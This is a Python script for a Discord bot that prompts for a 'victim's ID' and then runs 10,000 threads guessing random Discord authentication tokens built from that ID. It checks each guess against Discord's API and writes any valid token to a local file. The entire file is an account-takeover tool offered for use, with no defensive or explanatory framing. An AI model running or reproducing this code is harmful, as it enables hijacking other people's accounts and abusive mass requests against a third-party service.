import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
from colorama import Fore as C
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot

#https://discord.com/api/oauth2/authorize?client_id=709262126971224084&permissions=0&scope=bot


class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"{C.WHITE}Please paste the victim's ID here {C.BLACK}: {C.YELLOW}")
    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")
    print(f"{C.WHITE}Attempting to crack {C.YELLOW}{user}{C.WHITE}'s token")
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()

def gen(encodedid, encodedstamp):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(f'{C.WHITE}{token} {C.BLACK}: {C.GREEN}Valid')
        f = open("tokens.txt", "a")
        f.write(token)
        f.close() 
    else:
        print(f'{C.WHITE}{token} {C.BLACK}: {C.RED}Invalid')


token = os.environ.get("YOUR BOT TOKEN HERE")
client = MyClient()
client.run("YOUR BOT TOKEN HERE")
